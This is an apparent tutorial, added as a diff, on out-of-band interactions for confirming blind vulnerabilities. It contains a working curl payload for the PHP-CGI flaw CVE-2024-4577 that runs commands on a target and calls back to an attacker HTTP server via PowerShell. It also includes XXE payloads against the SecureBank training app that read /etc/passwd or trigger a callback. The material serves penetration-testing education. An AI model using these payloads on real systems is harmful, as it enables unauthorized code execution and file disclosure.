@@ -1,0 +1,145 @@
+                       __________________________
+
+                        OUT OF BAND INTERACTIONS
+
+                                Hexdump
+                       __________________________
+
+
+Table of Contents
+_________________
+
+1. Out of Band Interactions (OOB)
+2. Example #1 - Blind RCE
+3. Example #2 - XXE
+
+
+1 Out of Band Interactions (OOB)
+================================
+
+  Sometimes it is possible to find typical vulnerabilities such as
+  `SQLi', `OS injection', `XXE', `SSRF', but it is not possible to
+  directly view the response from the query. These are called `blind
+  vulnerabilities'. We can still exploit them, but we cannot see the
+  direct output.
+
+  To actually make sure that we have succesfully exploited such blind
+  vulnerabilities, a possible strategy is to employ `out of band
+  interactions'. These kind of interactions are called "out of band",
+  because they use a different communication channel.
+
+  In order to properly use an OOB interaction, you need a server that
+  can be accesed from the internet. Typically this is done by using
+  `third-party services', or by using privately owned `VPS' hosted
+  within `cloud providers'.
+
+  ,----
+  | 
+  |               In Band Interaction
+  |   Attacker <-----------------------> Vulnerable WebApp
+  |                                             ^
+  |                                             |
+  |                                             | Out of Band Interaction
+  |                                             |
+  |                                             v
+  |                                       Attacker Server (callback)
+  |                                       
+  `----
+
+  Let's see now some pratical examples.
+
+
+2 Example #1 - Blind RCE
+========================
+
+  Consider `CVE-2024-4577', an RCE within PHP-CGI deployments that run
+  on specific versions of Windows. The vulnerability has been covered in
+  depth within the following video:
+  - [PHP-CGI RCE via BestFit! - CVE-2024-4577]
+
+  To exploit the vulnerability you can use the following payload
+  ,----
+  | $ curl -X POST "http://192.168.122.236/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('calc.exe');?>"
+  `----
+
+  The problem with the above payload is that it spawns a `calc.exe'
+  within the target host. Let's say we cannot access the target machine.
+
+  *How can we understand if the payload has been properly executed?*
+
+  The idea is to use an OOB interaction with a remote server.
+
+  - Setup the `callback server'
+
+  ,----
+  | $ python3 -m http.server 1337
+  `----
+
+  - Send the command that triggers the OOB interaction
+
+    ,----
+    | powershell -Command \"Invoke-WebRequest -URI http://192.168.122.1:1337/malicious.txt\"
+    `----
+
+  - Wrap payload for specific CVE
+
+    ,----
+    | $ curl -X POST "http://192.168.122.236/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "<?php system('powershell -Command \"Invoke-WebRequest -URI http://192.168.122.1:1337/malicious.txt\"');?>"
+    `----
+
+
+[PHP-CGI RCE via BestFit! - CVE-2024-4577]
+<https://youtu.be/akfvxlkp_CU>
+
+
+3 Example #2 - XXE
+==================
+
+  Consider the `SecureBank' application, designed to be vulnerable and
+  to showcase `OWASP Top 10' vulnerabilities:
+  - <https://github.com/ssrdio/SecureBank>
+  - <https://ssrd.gitbook.io/securebank/>
+
+  To run the application
+  ,----
+  | docker run -d \
+  |        --network "host"\
+  |        -e 'SeedingSettings:Admin=admin@ssrd.io' \
+  |        -e 'SeedingSettings:AdminPassword=admin' \
+  |        ssrd/securebank
+  `----
+
+  Find the vulnerable functionality
+
+  ,----
+  | Login -> "admin@ssrd.io:admin"
+  |       -> Upload one or more transaction
+  `----
+
+  Check for reflective XXE
+  ,----
+  | <?xml version="1.0" encoding="UTF-8"?>
+  | <!DOCTYPE foo 
+  |   [
+  |       <!ELEMENT foo ANY >
+  |       <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+  | ]>
+  | <foo>&xxe;</foo>
+  `----
+
+  To enable OOB interaction start a python server and use a different
+  XXE payload
+  ,----
+  | python3 -m http.server 1337
+  `----
+
+  Check for OOB XXE
+  ,----
+  | <?xml version="1.0" encoding="UTF-8"?>
+  | <!DOCTYPE foo 
+  |   [
+  |       <!ELEMENT foo ANY >
+  |       <!ENTITY xxe SYSTEM "http://127.0.0.1:1337/hit" >
+  | ]>
+  | <foo>&xxe;</foo>
+  `----
